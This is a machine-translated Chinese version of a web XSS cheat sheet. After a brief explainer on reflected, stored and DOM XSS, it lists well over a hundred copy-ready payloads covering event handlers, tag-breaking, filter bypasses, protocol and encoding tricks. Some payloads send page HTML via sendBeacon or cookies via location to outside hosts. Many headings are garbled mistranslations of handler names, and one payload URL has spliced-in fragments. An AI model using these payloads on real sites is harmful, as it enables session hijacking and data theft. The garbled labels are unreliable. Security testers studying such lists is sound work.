# 下载 XSS 备忘单 PDF 快速参考

> 原文：<https://hackr.io/blog/xss-cheat-sheet>

XSS 或跨站脚本是一种注入执行，使网络应用程序的用户交互容易受到网络攻击。这可能会对网站造成严重损害，并危及网络安全。跨站点脚本(XSS)仍然是当今在线应用程序中检测到的最普遍的安全缺陷之一。因此，所有的网站开发者在创建网站时必须考虑 XSS 的严重性。

XSS 有许多命令、事件处理程序、框架、消费标签、无脚本攻击、编码和有用的属性。我们将涵盖所有这些，以及对 XSS 和 XSS 测试字符串的简要介绍，还有这张 XSS 备忘单。这是你的一站式商店为 XSS 司令部和更多。

[点击此处](https://drive.google.com/file/d/1mJFw9bAb4LBbLdzNPB-kvzUd6glxiAcP/view?usp=sharing)下载 Hackr.io 的 XSS 备忘单 PDF。

## 什么是 XSS？

跨站点脚本(XSS)是一种注入，攻击者将脚本(通常是 Javascript)注入网站。然后不处理它，允许它保留在浏览器中，允许脚本运行，就好像是管理员自己创建的一样。

这种注入可能会改变显示、修改浏览器，甚至获取您的会话 cookie 并以管理员身份登录，从而使黑客能够完全访问您的计算机。

之所以使用“可能”一词，是因为在 XSS 的脆弱性及其潜在影响方面存在许多模糊之处。把 XSS 缺陷看作是一种潜伏的病原体。人类感染一直处于休眠状态，直到某些东西导致它们实际出现，而 XSS 漏洞需要某种类型的活动，无论是社会工程还是某人访问页面并点击按钮。这可能马上发生，也可能需要一些时间。在其他方面，这增加了新的风险程度，因为如果工程师甚至不知道漏洞的存在，他们就无法设计补丁。

### **XSS 攻击的类型**

有三种类型的 XSS 攻击:

1.  反映了 XSS
2.  商店 XSS
3.  基于 DOM 的 XSS

**反射 XSS** :低严重性 XSS 攻击，攻击者将 Javascript 注入网站，但该脚本只影响他们自己的浏览器。黑客注入的任何脚本都不会伤害其他用户。

**存储 XSS** :在这种 XSS 中，攻击者将恶意代码注入网站，然后攻击者将其保存在数据库中。每个访问此页面并向服务器发送 http 请求的人都会受到影响。

**DOM XSS** :在这次 XSS 攻击中，攻击者将 Javascript 代码注入 html DOM。查找基于 DOM 的 XSS 需要一点时间，但是大多数网站都容易受到这种类型的 XSS 的攻击。高严重性的攻击，服务器不可能停止它。以下是一些影响的例子:

1.  **窃取认证 cookies。**攻击者的 Javascript 可以抓取整个文档 cookie 集合，并发送到攻击者控制的 URL。这个攻击者可以冒充你(从目标网站的角度)，做任何操作(以你的身份购买、发送消息、汇款)。
2.  注入额外的 HTML 标签来获取更多信息。例如，银行网站上的 XSS 可能会创建一个 SSN 字段，该字段看起来与页面上的其他字段一模一样。用户可能会被骗提供个人信息。
3.  **XSS 可以导致 CSRF。一个有半透明覆盖层的页面可能会欺骗用户，让他们相信他们点击的是完全不同的东西。**

[从头开始学习道德黑客](https://click.linksynergy.com/deeplink?id=jU79Zysihs4&mid=39197&murl=https%3A%2F%2Fwww.udemy.com%2Fcourse%2Flearn-ethical-hacking-from-scratch%2F)

### **事件处理程序**

事件处理程序是基于事件执行特定操作的 JavaScript 函数。在 XSS 预防备忘单的这一部分，我们将介绍各种事件处理程序。

#### **onanimationcancel**

当 CSS 动画被取消时激发

```
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
```

#### **onanimationend**

CSS 动画结束时激发

```
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
```

#### **onanimationiteration**

CSS 动画重复时激发

```
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
```

#### **onanimationstart**

当 CSS 动画开始时激发

```
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
```

#### **onbeforeprint**

在打印页面之前激发

```
<body onbeforeprint=console.log(1)>
```

#### **onbeforescriptexcut**

在脚本执行前激发

```
<xss onbeforescriptexecute=alert(1)><script>1</script>
```

#### **onbeforeunload**

当 URL 改变时触发

```
<body onbeforeunload=navigator.sendBeacon('//https://ssl.anonymous.net/',document.body.innerHTML)>
```

#### **onbegin**

当 svg 动画开始时启动

```
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

#### **onbounce**

当字幕反弹时发生

```
<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
```

#### **oncanplay**

如果资源可以使用，它将被解雇。

```
<audio oncanplay=alert(1)><source src="audio.wav" type="audio/wav"></audio>
```

#### **在线播放**

当加载了足够的数据来全程播放资源时，该事件处理程序将会触发。

```
<video oncanplaythrough=alert(1)><source src="video.mp4" type="video/mp4"></video>
```

#### **oncuechange**

字幕更改时发生

```
<video controls><source src=video.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE 1 00:00:00.000 --> 00:00:05.000 <b>XSS</b> "></video>
```

#### 波浪变化

持续时间改变时发生

```
<audio controls ondurationchange=alert(1)><source src=audio.mp3 type=audio/mpeg></audio>
```

#### **一日和**

当 svg 动画结束时激发

```
<svg><animate onend=alert(1) attributeName=x dur=1s>
```

#### **合二为一**

当资源播放完毕时触发

```
<audio controls autoplay onended=alert(1)><source src="audio.wav" type="audio/wav"></audio>
```

#### **一个错误**

当资源加载失败或导致错误时发生

```
<audio src/onerror=alert(1)>
```

#### **onfinish**

字幕完成时触发

```
<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
```

#### **Onfocus 和 onfocusin**

当元素有焦点时触发

```
<a id=x tabindex=1 onfocus=alert(1)></a>
```

#### **onhashchange**

哈希改变时触发

```
<body onhashchange="print()">
```

#### **加载**

加载元素时触发

```
<body onload=alert(1)>
```

#### **上传数据**

加载第一帧时触发

```
<audio onloadeddata=alert(1)><source src="audio.wav" type="audio/wav"></audio>
```

加载元数据时触发

```
<audio autoplay onloadedmetadata=alert(1)> <source src="audio.wav" type="audio/wav"></audio>
```

#### **已下载**

当元素完成加载时激发

```
<image src=image.png onloadend=alert(1)>
```

#### **onloadstart**

当元素开始加载时发生

```
<image src=image.png onloadstart=alert(1)>
```

#### **onmessage**

当从 postMessage 调用收到消息事件时发生

```
<body onmessage=print()>
```

#### **onpageshow**

页面显示时触发

```
<body onpageshow=alert(1)>
```

#### **Onplay 和 onplaying**

播放资源时被激发

```
<audio autoplay onplay=alert(1)><source src="audio.wav" type="audio/wav"></audio>
```

#### **onpopstate**

当历史改变时触发

```
<body onpopstate=print()>
```

#### **onprogress**

视频/音频开始下载时触发

```
<audio controls onprogress=alert(1)><source src=audio.mp3 type=audio/mpeg></audio>
```

#### **重复一次**

当 svg 动画重复时触发

```
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
```

#### **无记忆**

调整窗口大小时触发

```
<body onresize="print()">
```

当页面滚动时发生

```
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
```

#### **onstart**

字幕开始时触发

```
<marquee onstart=alert(1)>XSS</marquee>
```

#### **ontimeupdate**

当时间线改变时

```
<audio controls autoplay ontimeupdate=alert(1)><source src="audio.wav" type="audio/wav"></audio>
```

#### **ontoggle**

当详细信息标签展开时触发

```
<details ontoggle=alert(1) open>test</details>
```

#### **on transition 取消**

当 CSS 过渡取消时激发

```
<style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss>
```

#### **ontransitionend**

当 CSS 转换结束时触发

```
<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>
```

#### 背压运行

CSS 转换开始时触发

```
<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss>
```

#### **ontransitionstart**

当 CSS 转换开始时被激发

```
<style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss>
```

#### **onunhandledrejection**

承诺未兑现时触发

```
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
```

#### **他的上传**

当页面卸载时触发

```
<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
```

#### **onwebkitanimationend**

CSS 动画结束时触发

```
<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss>
```

#### **onwebkitanimationiteration**

当 CSS 动画重复时被激发

```
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>
```

#### **onwebkitanimationstart**

当 CSS 动画开始时触发

```
<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>
```

#### **onwebkittransitionend**

CSS 转换结束时触发

```
<style>:target {color:red;}</style><xss id=x style="transition:color element loses focus1s" onwebkittransitionend=alert(1)></xss>
```

#### **onafterprint**

在页面打印后激发

```
<body onafterprint=alert(1)>
```

#### **onauxlick**

右键单击或使用鼠标中键时激发

```
<input onauxclick=alert(1)>
```

#### **onbeforecopy**

要求您复制一段文本

```
<a onbeforecopy="alert(1)" contenteditable>test</a>
```

#### **onbeforecut**

要求您剪切一段文本

```
<a onbeforecut="alert(1)" contenteditable>test</a>
```

#### **onblur**

当元素失去焦点时激发

```
<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>
```

#### **onchange**

需要更改值

```
<input onchange=alert(1) value=xss>
```

#### **onclick**

需要单击元素

```
<xss onclick="alert(1)" style=display:block>test</xss>
```

#### **盎司**

当对话框关闭时激发

```
<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
```

右键单击显示上下文菜单时触发

```
<xss oncontextmenu="alert(1)" style=display:block>test</xss>
```

#### **oncopy**

要求你复制一段文字

```
<xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
```

#### **oncut**

要求你剪下一段文字

```
<xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
```

#### **波浪点击**

双击元素时触发

```
<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>
```

#### **条约**

拖动元素时触发

```
<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>
```

#### **不可抗力**

触发拖动在元素上完成

```
<xss draggable="true" ondragend="alert(1)" style=display:block>test</xss>
```

#### **反应物**

需要鼠标拖动

```
<xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss>
```

#### **软骨组织**

需要鼠标拖动

```
<xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss>
```

#### **ondragover**

在元素上拖动触发

```
<div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>
```

#### **ondragstart**

需要鼠标拖动

```
<xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss>
```

#### **ondrop**

触发了拖放可拖动元素

```
<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>
```

#### 担心

当元素失去焦点时激发

```
<xss onfocusout=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>
```

#### **信任筛选变更**

当视频改变全屏状态时激发

```
<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>
```

#### **oninput**

需要更改值

```
<input oninput=alert(1) value=xss>
```

#### **精氨酸有效**

要求表单提交具有不满足其约束的元素，如必需的属性

```
<form><input oninvalid=alert(1) required><input type=submit>
```

#### **叔叔家**

按键时触发

```
<xss onkeydown="alert(1)" contenteditable style=display:block>test</xss>
```

#### **有一台印刷机**

按键时触发

```
<xss onkeypress="alert(1)" contenteditable style=display:block>test</xss>
```

#### **onkeyup**

当释放一个键时触发

```
<xss onkeyup="alert(1)" contenteditable style=display:block>test</xss>
```

#### onmousedown

按下鼠标时触发

```
<xss onmousedown="alert(1)" style=display:block>test</xss>
```

#### **是鼠标输入**

当鼠标悬停在元素上时触发

```
<xss onmouseenter="alert(1)" style=display:block>test</xss>
```

#### **onous eleve**

当鼠标离开元素时触发

```
<xss onmouseleave="alert(1)" style=display:block>test</xss>
```

#### **onmousemove**

需要鼠标移动

```
<xss onmousemove="alert(1)" style=display:block>test</xss>
```

#### onmouseout

当鼠标离开元素时触发

```
<xss onmouseout="alert(1)" style=display:block>test</xss>
```

#### **onmouseover**

需要将鼠标悬停在元素上

```
<xss onmouseover="alert(1)" style=display:block>test</xss>
```

#### **是 mouseup** 的缩写

释放鼠标按钮时触发

```
<xss onmouseup="alert(1)" style=display:block>test</xss>
```

#### **onmousewheel**

当鼠标滚轮滚动时激发

```
<xss onmousewheel=alert(1) style=display:block>requires scrolling
```

#### **onozfull screen change**

当视频更改全屏状态时激发

```
<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>
```

#### **onpagehide**

当页面更改时激发

```
<body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
```

#### **onpaste**

需要你粘贴一段文字

```
<a onpaste="alert(1)" contenteditable>test</a>
```

#### **开启原因**

需要单击元素才能暂停

```
<audio autoplay controls onpause=alert(1)><source src="audio.wav" type="audio/wav"></audio>
```

#### **onpointerdown**

当鼠标按下时激发

```
<xss onpointerdown=alert(1) style=display:block>XSS</xss>
```

#### **on pointer 输入**

当鼠标进入时激发

```
<xss onpointerenter=alert(1) style=display:block>XSS</xss>
```

#### **onpointerleave**

当鼠标离开时激发

```
<xss onpointerleave=alert(1) style=display:block>XSS</xss>
```

#### **onpointermove**

当鼠标移动时激发

```
<xss onpointermove=alert(1) style=display:block>XSS</xss>
```

#### **onpointerout**

当鼠标离开时激发

```
<xss onpointerout=alert(1) style=display:block>XSS</xss>
```

#### **onpointerover**

当 mouseover(鼠标指向选定的元素)事件发生时激发

```
<xss onpointerover=alert(1) style=display:block>XSS</xss>
```

#### **onpointerrawupdate**

当指针改变时激发

```
<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>
```

#### **onpointerup**

当鼠标抬起时激发

```
<xss onpointerup=alert(1) style=display:block>XSS</xss>
```

#### **正在重置**

需要点击

```
<form onreset=alert(1)><input type=reset>
```

#### **onsearch**

当提交表单并且输入的类型属性为 search 时激发

```
<form><input type=search onsearch=alert(1) value="Hit return" autofocus>
```

#### **接通**

需要单击元素时间线

```
<audio autoplay controls onseeked=alert(1)><source src="audio.wav" type="audio/wav"></audio>
```

#### **开始**

需要单击元素时间线

```
<audio autoplay controls onseeking=alert(1)><source src="audio.wav" type="audio/wav"></audio>
```

#### **on 选择**

要求您选择文本

```
<input onselect=alert(1) value="XSS" autofocus>
```

#### **onselectionchange**

当页面上的文本选择被更改时激发

```
<body onselectionchange=alert(1)>select some text
```

#### **onselectstart**

开始文本选择时激发

```
<body onselectstart=alert(1)>select some text
```

#### **onshow**

显示火灾上下文菜单

```
<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>
```

#### **onsubmit**

需要提交表单

```
<form onsubmit=alert(1)><input type=submit>
```

#### **ontouchend**

当触摸屏，仅移动设备

```
<body ontouchend=alert(1)>
```

#### **触摸移动**

当触摸屏幕并移动时触发，仅移动设备

```
<body ontouchmove=alert(1)>
```

#### **ontouchstart**

触摸屏幕时触发，仅限移动设备

```
<body ontouchstart=alert(1)>
```

#### **onvolumechange**

需要音量调节

```
<audio autoplay controls onvolumechange=alert(1)><source src="audio.wav" type="audio/wav"></audio>
```

#### **车轮上**

使用鼠标滚轮时激发

```
<body onwheel=alert(1)>
```

接下来，在我们的 XSS 注射备忘单上，我们将带您浏览不同的消费标签。

#### **不嵌入消费标签**

```
<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
```

#### **无脚本消费标签**

```
<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>
```

#### **风格消费标签**

```
<style><img title="</style><img src onerror=alert(1)>"></style>
```

#### **脚本消费标签**

```
<script><img title="</script><img src onerror=alert(1)>"></script>
```

#### **iframe 消费标签**

```
<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>
```

#### **xmp 消费标签**

```
<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>
```

#### **textarea 消费标签**

```
<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
```

#### **无帧消费标签**

```
<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>
```

#### **标题消费标签**

```
<title><img title="</title><img src onerror=alert(1)>"></title>
```

### **文件上传攻击**

#### **将 Blob 添加到文件对象**

```
<input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Demo!'], 'demo.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>
```

### **受限字符**

我们的跨站点脚本备忘单的这一部分讨论了受限字符。

#### **无括号使用异常处理**

```
<script>onerror=alert;throw 1</script>
```

#### **没有使用异常处理的括号，没有分号**

```
<script>{onerror=alert}throw 1</script>
```

#### **没有使用异常处理的括号，没有使用表达式的分号**

```
<script>throw onerror=alert,1</script>
```

#### **无括号使用异常处理和评估**

```
<script>throw onerror=eval,'=alert\x281\x29'</script>
```

#### **在 Firefox 上使用异常处理和评估时没有括号**

```
<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
```

#### **使用 ES6 的括号没有 Instance 和 instanceof 与 eval**

```
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
```

#### **没有括号使用 ES6 hasInstance 和 instanceof with eval without。**

```
<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>
```

#### **没有使用位置重定向的括号**

```
<script>location='javascript:alert\x281\x29'</script>
```

#### **没有使用位置重定向的括号没有字符串**

```
<script>location=name</script>
```

#### **没有使用模板字符串的括号**

```
<script>alert`1`</script>
```

#### **没有使用模板字符串和位置散列的括号**

```
<script>new Function`X${document.location.hash.substr`1`}`</script>
```

#### **没有括号或空格，使用模板字符串和位置散列**

```
<script>Function`X${document.location.hash.substr`1`}```</script>
```

#### **没有圆括号、反斜杠或引号的 XSS cookie 过滤**

```
<video><source onerror=location=/\02.rs/+document.cookie>
```

#### **XSS 无大于**

```
<svg onload=alert(1)
```

#### **使用 onerror 进行基于数组的析构**

```
<script>throw[onerror]=[alert],1</script>
```

#### **使用一个错误进行析构**

```
<script>var{a:onerror}={a:alert};throw 1</script>
```

#### **使用默认值和 onerror 进行析构**

```
<script>var{haha:onerror=alert}=0;throw 1</script>
```

#### **使用 window.name 的矢量**

```
<script>window.name='javascript:alert(1)';</script><svg onload=location=name>
```

### **框架**

#### Bootstrap onanimationstart 事件

```
<xss class=progress-bar-animated onanimationstart=alert(1)>
```

#### **引导传输结束事件**

```
<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>
```

### **协议**

在 OWASP XSS 备忘单的这一部分，我们将介绍各种 XSS 协议。

#### **Iframe src 属性 JavaScript 协议**

```
<iframe src="javascript:alert(1)">
```

#### **使用 JavaScript 协议的对象数据属性**

```
<object data="javascript:alert(1)">
```

#### **用 JavaScript 协议嵌入 src 属性**

```
<embed src="javascript:alert(1)">
```

#### 标准的 JavaScript 协议

```
<a href="javascript:alert(1)">XSS</a>
```

#### **协议不区分大小写**

```
<a href="JaVaScript:alert(1)">XSS</a>
```

#### **协议前允许有字符\ x01-\ x20**

```
<a href=" javascript:alert(1)">XSS</a>
```

#### **协议中允许使用字符\x09、\x0a、\ x0d**

```
<a href="javas cript:alert(1)">XSS</a>
```

#### **冒号前的协议名称后允许有字符\x09、\x0a、\ x0d**

```
<a href="javascript :alert(1)">XSS</a>
```

#### **使用 JavaScript 协议的 SVG 中的 Xlink 名称空间**

```
<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>
```

#### **SVG 使用值制作标签动画**

```
<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
```

#### **SVG 动画标签使用到**

```
<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>
```

#### t0±SVG 设置 tago±t1±1

```
<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
```

#### **脚本 src 内的数据协议**

```
<script src="data:text/javascript,alert(1)"></script>
```

#### **没有结束脚本标签的 SVG 脚本 href 属性**

```
<svg><script href="data:text/javascript,alert(1)" />
```

#### **SVG 使用元素 Chrome/Firefox**

```
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.anonymous.org/2000/svg' xmlns:xlink='http://www.anonymous.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>
```

#### **导入数据 URL 为**的语句

```
<script>import('data:text/javascript,alert(1)')</script>
```

#### **使用 JavaScript 协议重写相对 URL 的基本标签**

```
<base href="javascript:/a/-alert(1)///////"><a href=../lol/page.html>test</a>
```

#### MathML 使得任何标签都可以点击

```
<math><x href="javascript:alert(1)">blah
```

#### **按钮和动作**

```
<form><button formaction=javascript:alert(1)>XSS
```

#### **输入和形成动作**

```
<form><input type=submit formaction=javascript:alert(1) value=XSS>
```

#### **形式和动作**

```
<form action=javascript:alert(1)><input type=submit value=XSS>
```

#### **用关键时间和多值制作标签动画**

```
<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>
```

#### **带新行的 JavaScript 协议**

```
<a href="javascript://%0aalert(1)">XSS</a>
```

#### **使用元素和 base64 编码的数据 URL**

```
<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>
```

#### **带有使用元素的数据 URL**

```
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```

#### **使用自动执行元素制作标签动画**

```
<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x />
```

### **其他有用的属性**

#### **使用 srcdoc 属性**

```
<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>
```

#### **对实体使用 srcdoc**

```
<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>
```

#### **在页面的任何地方点击提交元素，甚至在表单之外**

```
<form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label>
```

#### **隐藏输入:访问键属性可以在通常不可利用的元素上启用 XSS**

```
<input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
```

#### **链接元素:访问键属性可以在通常不可利用的元素上启用 XSS**

```
<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
```

#### **下载属性可以保存当前网页的副本**

```
<a href=# download="filename.html">Test</a>
```

#### **使用推荐策略**禁用推荐

```
<img referrerpolicy="no-referrer" src="//portswigger-labs.net">
```

#### **通过 window.open 函数的参数设置 window.name】**

```
<a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')">XSS</a>
```

#### **通过< iframe >标签**中的 name 属性设置 window.name

```
<iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe>
```

#### **通过<基>标签**中的目标属性设置 window.name

```
<base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a>
```

#### **通过<标签**中的目标属性设置 window.name

```
<a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a>
```

#### **通过< img >标签**中的 usemap 属性设置 window.name

```
<img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_st%C0%BCscript>alert(1)</script> %E0%80%BCscript>alert(1)</script> %F0%80%80%BCscript>alert(1)</script> %F8%80%80%80%BCscript>alert(1)</script> %FC%80%80%80%80%BCscript>alert(1)</script>ring_single&x=%27;eval(name)//"></map>
```

#### **通过<表单>标签**中的目标属性设置 window.name

```
<form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form>
```

#### **通过 formtarget 属性在<中设置 window.name 输入>标签类型提交**

```
<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form>
```

#### **通过<输入>标签类型图片**中的 formtarget 属性设置 window.name

```
<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"></form>
```

现在，让我们继续探索用于 XSS 的各种特殊标签。

#### **重定向到不同的域**

```
<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">
```

```
<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

```
<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

#### **UTF-7 BOM 字符(必须在文档的开头)1**

```
+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

#### **UTF-7 BOM 字符(必须在文档的开头)2**

```
+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

#### **UTF-7 BOM 字符(必须在文档的开头)3**

```
+/v+ +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

#### **UTF-7 BOM 字符(必须在文档的开头)4**

```
+/v/ +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

#### **升级不安全请求**

```
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
```

#### **通过 iframe 沙箱禁用 JavaScript】**

```
<iframe sandbox src="//portswigger-labs.net"></iframe>
```

#### **禁用推荐人**

```
<meta name="referrer" content="no-referrer">
```

### **编码**

#### **超长 UTF-8**

```
<script>\u0061lert(1)</script>
```

**Unicode 转义 ES6 样式**

```
<script>\u{61}lert(1)</script>
```

**Unicode 转义 ES6 样式零填充**

```
<script>\u{0000000061}lert(1)</script>
```

**十六进制编码 JavaScript 转义**

```
<script>eval('\x61lert(1)')</script>
```

#### **八进制编码**

```
<script>eval('\141lert(1)')</script> <script>eval('alert(\061)')</script> <script>eval('alert(\61)')</script>
```

#### **带可选分号的十进制编码**

```
<a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a>
```

#### **带 HTML 编码的 SVG 脚本**

```
<svg><script>&#97;lert(1)</script></svg> <svg><script>&#x61;lert(1)</script></svg> <svg><script>alert&NewLine;(1)</script></svg> <svg><script>x="&quot;,alert(1)//";</script></svg>
```

#### **带填充零的十进制编码**

```
<a href="&#0000106avascript:alert(1)">XSS</a>
```

#### **十六进制编码实体**

```
<a href="&#x6a;avascript:alert(1)">XSS</a>
```

#### **不带分号的十六进制编码提供的下一个字符不是 a-f0-9**

```
<a href="j&#x61vascript:alert(1)">XSS</a> <a href="&#x6a avascript:alert(1)">XSS</a> <a href="&#x6a avascript:alert(1)">XSS</a>
```

#### **带填充零的十六进制编码**

```
<a href="&#x0000006a;avascript:alert(1)">XSS</a>
```

#### **十六进制编码不区分大小写**

```
<a href="&#X6A;avascript:alert(1)">XSS</a>
```

#### **HTML 实体**

```
<a href="javascript&colon;alert(1)">XSS</a> <a href="java&Tab;script:alert(1)">XSS</a> <a href="java&NewLine;script:alert(1)">XSS</a> <a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>
```

#### **网址编码**

```
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
```

#### **HTML 实体和 URL 编码**

```
<a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a>
```

### **混淆**

#### **base64 脚本 src 内的数据协议**

```
<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>
```

#### **带有 base64 和 HTML 实体的脚本 src 内的数据协议**

```
<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>
```

#### **带 base64 和 URL 编码的脚本 src 内的数据协议**

```
<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>
```

#### **Iframe srcdoc HTML 编码**

```
<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>
```

#### **带有 HTML 和 URL 编码的 Iframe JavaScript URL**

```
<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
